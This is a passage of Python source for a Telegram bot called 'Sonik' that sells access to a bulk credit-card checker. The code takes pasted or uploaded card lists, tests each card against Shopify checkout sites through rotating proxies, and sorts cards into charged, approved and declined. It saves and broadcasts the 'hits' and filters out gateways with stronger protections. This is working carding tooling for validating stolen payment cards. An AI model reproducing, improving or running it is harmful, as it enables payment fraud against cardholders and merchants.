👤 <b>{bs('User')}:</b> <code>{target_uid}</code>""", emoji_ids=[CE["crown"], CE["crown"], CE["check"]])
    except Exception as e:
        await styled_reply(event, f"⚠️ <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])
@client.on(events.NewMessage(pattern=r'(?i)^[/.]resetsites$'))
async def reset_sites_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    await clear_all_global_sites()
    await styled_reply(event, f"🔄 <b>{bs('All sites have been cleared')}</b>\n➕ <i>{bs('Use /add to add new sites')}</i>", emoji_ids=[CE["check"], CE["info"]])
@client.on(events.NewMessage(pattern=r'(?i)^[/.]stats$'))
async def stats_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    try:
        tu = await get_total_users()
        pu = await get_premium_count()
        tc = await get_total_cards_count()
        ch = await get_charged_count()
        ap = await get_approved_count()
        sites_count = await get_total_sites_count()
        total_codes = await db["codes"].count_documents({})
        used_codes = await db["codes"].count_documents({"used": True})
        await styled_reply(event, f"""📊 <b>{bs('Sonik Statistics')}</b> 📊
<b>━━━━━━━━━━━━━━━━━</b>
👥 <b>{bs('Users')}:</b> <code>{tu}</code>
✅ <b>{bs('Subscribed')}:</b> <code>{pu}</code>
💳 <b>{bs('Cards Checked')}:</b> <code>{tc}</code>
🔥 <b>{bs('Charged')}:</b> <code>{ch}</code>
✅ <b>{bs('Approved')}:</b> <code>{ap}</code>
🌐 <b>{bs('Sites')}:</b> <code>{sites_count}</code>
🎁 <b>{bs('Codes Generated')}:</b> <code>{total_codes}</code>
✅ <b>{bs('Codes Used')}:</b> <code>{used_codes}</code>
<b>━━━━━━━━━━━━━━━━━</b>
⚡ <b>{bs('MSP Active')}:</b> <code>{len(ACTIVE_MTXT_PROCESSES)}</code> ({MSP_PER_USER_WORKERS}w)""", emoji_ids=[CE["fire"], CE["fire"], CE["chart"], CE["link"], CE["gem"], CE["star"], CE["brain"], CE["shield"]])
    except Exception as e:
        await styled_reply(event, f"⚠️ <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])
@client.on(events.NewMessage(pattern=r'(?i)^[/.]stop$'))
async def stop_cmd(event):
    uid = event.sender_id
    proc = ACTIVE_MTXT_PROCESSES.get(uid)
    if proc and isinstance(proc, dict):
        proc["stopped"] = True
        for task in proc.get("tasks", []):
            if not task.done():
                task.cancel()
        await styled_reply(event, f"⛔ <b>{bs('Stopping process...')}</b>", emoji_ids=[CE["stop"]])
    else:
        await styled_reply(event, f"⚠️ <b>{bs('No active process')}</b>", emoji_ids=[CE["warn"]])
@client.on(events.NewMessage(pattern=r'(?i)^[/.]msp\b'))
async def mass_check_cmd(event):
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    if uid not in ADMIN_ID and not await is_user_subscribed(uid):
        return await send_no_subscription_message(event)
    await update_last_seen(uid)
    if uid in ACTIVE_MTXT_PROCESSES:
        proc = ACTIVE_MTXT_PROCESSES.get(uid)
        if proc and not proc.get("stopped", True):
            return await styled_reply(event, f"⚠️ <b>{bs('You already have an active process')}</b>\n⛔ {bs('Use /stop to cancel it first')}", emoji_ids=[CE["warn"]])
    sites = await get_global_sites()
    if not sites:
        return await styled_reply(event, f"⚠️ <b>{bs('No sites available. Admin please add sites.')}</b>", emoji_ids=[CE["warn"]])
    proxies = await get_all_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, f"""🛡️ <b>{bs('No Proxies Found')}</b> 🛡️
<b>━━━━━━━━━━━━━━━━━</b>
⚠️ <b>{bs('You must add proxies first')}</b>
💡 <i>{bs('Use /addpxy to add proxies')}</i>
<b>━━━━━━━━━━━━━━━━━</b>
📝 <code>/addpxy ip:port:user:pass</code>
💡 <i>{bs('Then try /msp again')}</i>""", emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["link"], CE["info"]])
    content = ""
    cmd_text = re.sub(r'^[/.]msp\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if cmd_text:
        content = cmd_text
        from_inline = True
    elif event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if not rm:
            return await styled_reply(event, f"⚠️ <b>{bs('Message not found')}</b>", emoji_ids=[CE["warn"]])
        if rm.document:
            fp = await rm.download_media()
            try:
                async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                    content = await f.read()
                os.remove(fp)
            except:
                pass
        elif rm.text:
            content = rm.text
        from_inline = True
    else:
        from_inline = False
    cards = extract_cc(content)
    if not cards:
        if from_inline:
            return await styled_reply(event, f"⚠️ <b>{bs('No valid cards')}</b>", emoji_ids=[CE["cross"]])
        else:
            return await styled_reply(event, f"📝 <b>{bs('Reply to .txt or paste cards after')} </b><code>/msp</code>", emoji_ids=[CE["info"]])
    if uid not in ADMIN_ID and len(cards) > MAX_CARDS_MASS:
        cards = cards[:MAX_CARDS_MASS]
        await styled_reply(event, f"⚠️ <b>{bs('Limited to')} {MAX_CARDS_MASS} {bs('cards for non-admin users')}</b>", emoji_ids=[CE["warn"]])
    elif len(cards) > 10000 and uid in ADMIN_ID:
        cards = cards[:10000]
        await styled_reply(event, f"⚠️ <b>{bs('Limited to 10000 cards per check')}</b>", emoji_ids=[CE["warn"]])
    kb = [
        [pbtn(f"❤️‍🔥 {bs('CHARGED ONLY')}", f"mass_filter:charged:{uid}", style="danger")],
        [pbtn(f"✅ {bs('APPROVED ONLY')}", f"mass_filter:approved:{uid}", style="success")],
        [pbtn(f"⚡️ {bs('BOTH (CHARGED + APPROVED)')}", f"mass_filter:both:{uid}", style="primary")]
    ]
    pm = await styled_reply(event, f"""📊 <b>{bs('MASS CHECKER CONFIG')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
📋 <b>{bs('Cards Loaded')}:</b> <code>{len(cards)}</code>
💡 <i>{bs('Choose which results you want to receive in chat')}</i>
<b>━━━━━━━━━━━━━━━━━</b>
𝗗𝗲𝘃 → sonik""", buttons=kb, emoji_ids=[CE["chart"], CE["fire"]])
    USER_APPROVED_PREF[f"mass_{uid}"] = {"cards": cards, "sites": sites, "proxies": proxies, "event": event, "pref_msg": pm, "rotator": SmartRotator()}
@client.on(events.CallbackQuery(pattern=rb"mass_filter:(charged|approved|both):(\d+)"))
async def mass_filter_cb(event):
    filter_type = event.pattern_match.group(1).decode()
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid:
        return await event.answer(f"🚫 {bs('Not yours')}!", alert=True)
    data = USER_APPROVED_PREF.pop(f"mass_{uid}", None)
    if not data:
        return await event.answer(f"⏰ {bs('Expired')}!", alert=True)
    try:
        await data["pref_msg"].delete()
    except:
        pass
    if uid in ACTIVE_MTXT_PROCESSES:
        return await event.answer(f"⚠️ {bs('Already running')}!", alert=True)
    ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
    await event.answer(f"🚀 {bs('Starting')}...")
    rotator = data.get("rotator", SmartRotator())
    sites, proxies = data["sites"], data["proxies"]
    send_approved = filter_type in ["approved", "both"]
    async def shopify_check(card, http_session):
        result = await check_card_with_retry(card, sites, uid, proxies, 3, rotator, cancel_check=lambda: ACTIVE_MTXT_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
        return result
    asyncio.create_task(_run_mass_process(data["event"], data["cards"], proxies, send_approved, ACTIVE_MTXT_PROCESSES, "stop_mass", shopify_check, "Shopify", "msp", filter_type))
@client.on(events.CallbackQuery(pattern=rb"stop_mass:(\d+)"))
async def stop_mass_cb(event):
    puid = int(event.pattern_match.group(1).decode())
    if event.sender_id != puid and event.sender_id not in ADMIN_ID:
        return await event.answer(f"🚫 {bs('Not yours')}!", alert=True)
    proc = ACTIVE_MTXT_PROCESSES.get(puid)
    if not proc:
        return await event.answer(f"⚠️ {bs('None active')}!", alert=True)
    if isinstance(proc, dict):
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done():
                t.cancel()
    await event.answer(f"⛔ {bs('Stopping')}...", alert=True)
async def _run_mass_process(event, cards, proxies, send_approved, process_store, stop_prefix, check_func, gate_name, sem_type, filter_type="both"):
    uid = event.sender_id
    user_check = await db["users"].find_one({"user_id": uid})
    if user_check and user_check.get("banned", False):
        process_store[uid] = {"stopped": True}
        await styled_reply(event, f"🚫 <b>{bs('You are banned. Process stopped.')}</b>", emoji_ids=[CE["stop"]])
        return
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
        name = sender.first_name or "User"
    except:
        username, name = f"user_{uid}", "User"
    total = len(cards)
    checked = charged = approved = declined = errors = 0
    st = time.time()
    hits = []
    workers = MSP_PER_USER_WORKERS
    user_sem = get_user_sem(uid, sem_type)
    http_session = await get_user_http_session(uid, sem_type)
    sm = await styled_reply(event, f"⚡ <b>{bs('Processing')} ━ {gate_name} ━ {workers}{bs('w')}</b>", emoji_ids=[CE["chart"]])
    last_ui = [0]
    lcd, lrd = "-", "-"
    def is_stopped():
        proc = process_store.get(uid)
        if not proc:
            return True
        return proc.get("stopped", False) if isinstance(proc, dict) else False
    async def check_banned_async():
        user_check2 = await db["users"].find_one({"user_id": uid})
        if user_check2 and user_check2.get("banned", False):
            proc = process_store.get(uid)
            if proc and isinstance(proc, dict):
                proc["stopped"] = True
            return True
        return False
    async def update_ui():
        nonlocal last_ui
        now = time.time()
        if now - last_ui[0] < 5.0 or is_stopped():
            return
        if await check_banned_async():
            return
        last_ui[0] = now
        kb = [
            [pbtn(f"💳 {lcd}", "none", style="primary")],
            [pbtn(f"📝 {lrd}", "none", style="primary")],
            [pbtn(f"❤️‍🔥 {bs('CHARGED')} ━ {charged}", "none", style="danger")],
            [pbtn(f"✅ {bs('APPROVED')} ━ {approved}", "none", style="success")],
            [pbtn(f"❌ {bs('DECLINED')} ━ {declined}", "none", style="danger"), pbtn(f"⚠️ {bs('ERROR')} ━ {errors}", "none", style="danger")],
            [pbtn(f"📋 {checked} / {total}", "none", style="primary")],
            [pbtn(f"⛔ {bs('STOP PROCESS')}", f"{stop_prefix}:{uid}", style="danger")]
        ]
        try:
            await styled_edit(sm, f"⚡️ <b>{bs('MASS CHECKING IN PROGRESS')}</b> ⚡️\n<b>━━━━━━━━━━━━━━━━━</b>\n⏳ <b>{bs('Elapsed')}:</b> <code>{int(time.time()-st)}s</code>\n<b>━━━━━━━━━━━━━━━━━</b>", buttons=kb, emoji_ids=[CE["chart"]])
        except:
            pass
    async def worker(card):
        nonlocal checked, charged, approved, declined, errors, lcd, lrd
        if is_stopped():
            return
        if await check_banned_async():
            return
        async with user_sem:
            if is_stopped():
                return
            try:
                result = await check_func(card, http_session)
                if is_stopped():
                    return
                status = result.get("Status", "Declined")
                resp = result.get("Response", "")
                gw = result.get("Gateway", gate_name)
                checked += 1
                lcd = card
                lrd = resp[:30]
                if status == "Error":
                    errors += 1
                elif status == "Charged":
                    charged += 1
                    hits.append(f"{card} - CHARGED - {resp} - {gw}")
                    asyncio.create_task(save_card_to_db(card, "CHARGED", resp, gw, result.get('Price', '-')))
                    asyncio.create_task(_send_mass_hit(card, result, status, uid, username, name))
                elif status == "Approved":
                    approved += 1
                    hits.append(f"{card} - APPROVED - {resp} - {gw}")
                    asyncio.create_task(save_card_to_db(card, "APPROVED", resp, gw, result.get('Price', '-')))
                    if send_approved:
                        asyncio.create_task(_send_mass_hit(card, result, status, uid, username, name))
                else:
                    declined += 1
                await update_ui()
            except asyncio.CancelledError:
                return
            except FloodWaitError as e:
                wait_time = e.seconds + 2
                log_user(uid, "FLOOD", f"Mass check flood wait {wait_time}s", "warning")
                await asyncio.sleep(wait_time)
            except:
                if not is_stopped():
                    errors += 1
                    checked += 1
    batch_size = workers * 2
    all_tasks = []
    proc = process_store.get(uid)
    for i in range(0, len(cards), batch_size):
        if is_stopped():
            break
        if await check_banned_async():
            break
        batch_tasks = [asyncio.create_task(worker(c)) for c in cards[i:i+batch_size]]
        all_tasks.extend(batch_tasks)
        if isinstance(proc, dict):
            proc["tasks"] = all_tasks
        await asyncio.gather(*batch_tasks, return_exceptions=True)
        if not is_stopped():
            await asyncio.sleep(0.3)
    await asyncio.sleep(0.3)
    el = int(time.time() - st)
    h, m, s = el // 3600, (el % 3600) // 60, el % 60
    stop_label = f" ({bs('Stopped')})" if is_stopped() else ""
    ft = f"""✅ <b>{bs('Complete')}{stop_label}</b> ✅
<b>━━━━━━━━━━━━━━━━━</b>
🔥 <b>{bs('Charged')}</b> ━ <code>{charged}</code>
✅ <b>{bs('Approved')}</b> ━ <code>{approved}</code>
❌ <b>{bs('Declined')}</b> ━ <code>{declined}</code>
⚠️ <b>{bs('Errors')}</b> ━ <code>{errors}</code>
<b>━━━━━━━━━━━━━━━━━</b>
📋 <b>{bs('Checked')}</b> ━ <code>{checked}/{total}</code>"""
    fkb = [
        [pbtn(f"🔥 {bs('C')} ━ {charged}", "none"), pbtn(f"✅ {bs('A')} ━ {approved}", "none")],
        [pbtn(f"📋 {bs('T')} ━ {checked}/{total}", "none"), pbtn(f"⏱️ {h}{bs('h')}{m}{bs('m')}{s}{bs('s')}", "none")]
    ]
    for _ in range(3):
        try:
            await styled_edit(sm, ft, buttons=fkb, emoji_ids=[CE["crown"], CE["crown"], CE["gem"], CE["check"], CE["declined"], CE["warn"], CE["star"]])
            break
        except:
            await asyncio.sleep(0.5)
    await send_final_file(uid, charged, approved, declined, errors, total, hits, uid)
    process_store.pop(uid, None)
    await cleanup_user_http_session(uid, sem_type)
    cleanup_user_sem(uid)
async def _send_mass_hit(card, result, status, uid, username, name):
    await asyncio.sleep(HIT_DELAY)
    try:
        bi = await get_bin_info(card.split("|")[0])
        gw = result.get('Gateway', 'Shopify')
        resp = result.get('Response', '')[:150]
        msg, eid = format_card_result(status, card, gw, resp, result.get('Price', '-'), result.get('site', '-'), bi, 0.0)
        try:
            HIT_BUTTON = [[Button.url(f"{gemj('rocket', for_button=True)} {bs('Sonik')}", f"https://t.me/{MAIN_BOT_USERNAME}")]]
            await styled_send(uid, msg, emoji_ids=eid, buttons=HIT_BUTTON)
        except:
            pass
        if status in ["Charged", "Approved"]:
            asyncio.create_task(send_channel_hit(result, uid, username, name))
    except:
        pass
async def send_final_file(uid, charged, approved, declined, errors, total, hits=None, target_chat=None):
    hits = hits or []
    fn = f"sonik_{uid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    target = target_chat or uid
    try:
        async with aiofiles.open(fn, 'w', encoding='utf-8') as f:
            await f.write(f"{'='*49}\nSONIK RESULTS\n{'='*49}\n\nCharged: {charged}\nApproved: {approved}\nDeclined: {declined}\nErrors: {errors}\nTotal: {total}\n")
            if hits:
                await f.write(f"\n{'='*49}\nHITS\n{'='*49}\n\n")
                for h in hits:
                    await f.write(h + "\n")
        try:
            await styled_send(target, f"📊 <b>{bs('Results')}</b> 📊", emoji_ids=[CE["fire"], CE["fire"]], file=fn)
        except:
            pass
        try:
            os.remove(fn)
        except:
            pass
    except:
        pass
async def cleanup_expired_loop():
    while True:
        try:
            count = await cleanup_expired_subscriptions()
            if count > 0:
                log_system("CLEANUP", f"Cleaned {count} expired subscriptions")
            expired_codes = await db["codes"].delete_many({
                "expires_at": {"$lt": datetime.now(timezone.utc)},
                "used": False
            })
            if expired_codes.deleted_count > 0:
                log_system("CLEANUP", f"Cleaned {expired_codes.deleted_count} expired codes")
            global _BIN_CACHE, _BIN_CACHE_TIME
            now = time.time()
            keys_to_remove = []
            for key, cache_time in _BIN_CACHE_TIME.items():
                if now - cache_time > _BIN_CACHE_TTL * 2:
                    keys_to_remove.append(key)
            for key in keys_to_remove:
                _BIN_CACHE.pop(key, None)
                _BIN_CACHE_TIME.pop(key, None)
            if keys_to_remove:
                log_system("CLEANUP", f"Cleaned {len(keys_to_remove)} BIN cache entries")
        except Exception as e:
            log_system("CLEANUP", f"Error: {e}", "error")
        await asyncio.sleep(3600)
@client.on(events.CallbackQuery(data=b"menu_checker"))
async def menu_checker_handler(event):
    await event.answer("⌛ Loading...")
    text = f"""{gemj('fire_premium')} <b>{bs('CHECKER MENU')}</b> {gemj('heart_fire')}
<b>━━━━━━━━━━━━━━━━━</b>
{gemj('wine')} <b>{bs('Shopify Checker')}</b>
│  {gemj('cool')} <code>/sp cc|mm|yy|cvv</code>  ━  <b>{bs('Single CC')}</b>
│  {gemj('sled')} <code>/msp</code> (reply to list)  ━  <b>{bs('Mass CC')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
{gemj('diamond')} 𝗗𝗲𝘃 → sonik"""
    await styled_edit(event, text, buttons=[[Button.inline(f"{gemj('snowman', for_button=True)} Back", data="back_to_start", style="danger")]])
@client.on(events.CallbackQuery(data=b"menu_sites"))
async def menu_sites_handler(event):
    await event.answer("⌛ Loading...")
    text = f"""{gemj('diamond')} <b>{bs('SITES CONTROL')}</b> {gemj('diamond')}
<b>━━━━━━━━━━━━━━━━━</b>
│  ➕ <code>/add url</code>  ━  <b>{bs('Add sites')}</b>
│  ➖ <code>/rm url</code>  ━  <b>{bs('Remove site')}</b>
│  📋 <code>/sites</code>  ━  <b>{bs('View all sites')}</b>
│  🔍 <code>/site</code>  ━  <b>{bs('Test all sites')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
{gemj('snowman')} 𝗗𝗲𝘃 → sonik"""
    await styled_edit(event, text, buttons=[[Button.inline(f"{gemj('snowman', for_button=True)} Back", data="back_to_start", style="danger")]])
@client.on(events.CallbackQuery(data=b"menu_proxy"))
async def menu_proxy_handler(event):
    await event.answer("⌛ Loading...")
    text = f"""{gemj('sled')} <b>{bs('PROXY CONTROL')}</b> {gemj('sled')}
<b>━━━━━━━━━━━━━━━━━</b>
│  ➕ <code>/addpxy proxy</code>  ━  <b>{bs('Add proxy')}</b>
│  📋 <code>/proxy</code>  ━  <b>{bs('View proxies')}</b>
│  🔍 <code>/chkpxy</code>  ━  <b>{bs('Test proxies')}</b>
│  ➖ <code>/rmpxy</code>  ━  <b>{bs('Remove all')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
{gemj('wine')} 𝗗𝗲𝘃 → sonik"""
    await styled_edit(event, text, buttons=[[Button.inline(f"{gemj('snowman', for_button=True)} Back", data="back_to_start", style="danger")]])
@client.on(events.CallbackQuery(data=b"menu_account"))
async def menu_account_handler(event):
    await event.answer("⌛ Loading...")
    uid = event.sender_id
    sub = await get_user_subscription(uid)
    access = "OWNER" if uid in ADMIN_ID else (sub["plan"].upper() if sub["is_active"] else "TRIAL")
    text = f"""{gemj('cool')} <b>{bs('MY ACCOUNT')}</b> {gemj('cool')}
<b>━━━━━━━━━━━━━━━━━</b>
{gemj('fire_premium')} <b>{bs('User')}:</b> <code>{uid}</code>
{gemj('heart_fire')} <b>{bs('Access')}:</b> <b>{access}</b>
{gemj('diamond')} <code>/redeem code</code>  ━  <b>{bs('Redeem Code')}</b>
{gemj('wine')} <code>/info</code>  ━  <b>{bs('Full Stats')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
{gemj('snowman')} 𝗗𝗲𝘃 → sonik"""
    await styled_edit(event, text, buttons=[[Button.inline(f"{gemj('snowman', for_button=True)} Back", data="back_to_start", style="danger")]])
@client.on(events.CallbackQuery(data=b"menu_admin"))
async def menu_admin_handler(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return await event.answer("🚫 Admin only!", alert=True)
    await event.answer("⌛ Loading...")
    text = f"""{gemj('snowman')} <b>{bs('ADMIN PANEL')}</b> {gemj('snowman')}
<b>━━━━━━━━━━━━━━━━━</b>
│  {gemj('fire_premium')} <code>/code hours</code>  ━  <b>{bs('Gen Code')}</b>
│  {gemj('heart_fire')} <code>/ban id</code>  ━  <b>{bs('Block user')}</b>
│  {gemj('diamond')} <code>/broadcast</code>  ━  <b>{bs('Global Msg')}</b>
│  {gemj('wine')} <code>/maintenance</code>  ━  <b>{bs('Toggle')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
{gemj('cool')} 𝗗𝗲𝘃 → sonik"""
    await styled_edit(event, text, buttons=[[Button.inline(f"{gemj('snowman', for_button=True)} Back", data="back_to_start", style="danger")]])
@client.on(events.CallbackQuery(data=b"back_to_start"))
async def back_to_start_handler(event):
    await event.answer("🔙 Returning...")
    try:
        await event.delete()
    except:
        pass
    await start(event)
async def fetch_premium_emojis():
    global CE
    try:
        from telethon.tl.functions.messages import GetStickerSetRequest
        from telethon.tl.types import InputStickerSetShortName
        pack_short_name = "sticks_27356_by_TgEmojis_bot"
        sticker_set = await client(GetStickerSetRequest(
            stickerset=InputStickerSetShortName(short_name=pack_short_name),
            hash=0
        ))
        if sticker_set and sticker_set.documents:
            docs = sticker_set.documents
            num_docs = len(docs)
            keys = ["fire_premium", "heart_fire", "cool", "sled", "wine", "diamond", "snowman", "crown", "bolt", "star", "gem"]
            for i, key in enumerate(keys):
                if i < num_docs:
                    CE[key] = docs[i].id
            log_system("BOOT", f" ✅ Successfully loaded {min(num_docs, len(keys))} premium emojis from pack!")
    except Exception as e:
        log_system("BOOT", f" ⚠️ Could not fetch premium emojis: {e}", "warning")
async def health_monitor_loop():
    while True:
        try:
            await HEALTH_MONITOR.check_health()
            if not HEALTH_MONITOR.is_healthy:
                log_system("HEALTH", "⚠️ Server unhealthy, activating protection", "warning")
                GLOBAL_THROTTLER.current_delay = min(GLOBAL_THROTTLER.current_delay * 1.5, 0.5)
            else:
                if GLOBAL_THROTTLER.current_delay > 0.1:
                    GLOBAL_THROTTLER.current_delay = max(GLOBAL_THROTTLER.current_delay * 0.95, 0.01)
        except:
            pass
        await asyncio.sleep(30)
async def main():
    global MAIN_BOT_USERNAME, client_instance
    log_system("BOOT", "Initializing database...")
    await init_db()
    try:
        await db["codes"].create_index("code", unique=True)
        await db["codes"].create_index("expires_at")
        await db["codes"].create_index("used")
    except:
        pass
    log_system("BOOT", "Starting cleanup loop...")
    asyncio.create_task(cleanup_expired_loop())
    asyncio.create_task(health_monitor_loop())
    while True:
        try:
            log_system("BOOT", "Starting bot...")
            await client.start(bot_token=BOT_TOKEN)
            await fetch_premium_emojis()
            me = await client.get_me()
            MAIN_BOT_USERNAME = me.username
            client_instance = client
            log_system("BOOT", f"✅ Sonik Bot (@{MAIN_BOT_USERNAME}) started!")
            log_system("BOOT", "✅ Enhanced features: Only accepted responses (3DS_REQUIRED, INSUFFICIENT_FUNDS, CARD_DECLINED, ORDER_PAID, CHARGED, PAYMENT_SUCCESSFUL)")
            log_system("BOOT", "✅ Rejected responses: empty submit, no valid payment, cart failed, checkout token errors")
            log_system("BOOT", "✅ Price filtering from 0.01 USD")
            log_system("BOOT", "✅ 3ds_required classified as Approved")
            log_system("BOOT", "✅ Code system enabled: /code and /redeem")
            log_system("BOOT", "✅ Proxy required for /sp and /msp")
            log_system("BOOT", "✅ Adaptive protection with Circuit Breaker and Session Pool")
            log_system("BOOT", "✅ Rejected gateways: Authorize.Net, Checkout.com, Stripe Card Payments")
            log_system("BOOT", f"✅ Workers: SP={SP_PER_USER_WORKERS} MSP={MSP_PER_USER_WORKERS} SITE={SITE_PER_USER_WORKERS}")
            await client.run_until_disconnected()
        except FloodWaitError as e:
            log_system("FLOOD", f"Sleeping {e.seconds+5}s", "warning")
            await asyncio.sleep(e.seconds + 5)
        except Exception as e:
            log_system("CRASH", f"{e}", "error")
            await asyncio.sleep(10)
if __name__ == "__main__":
    asyncio.run(main())
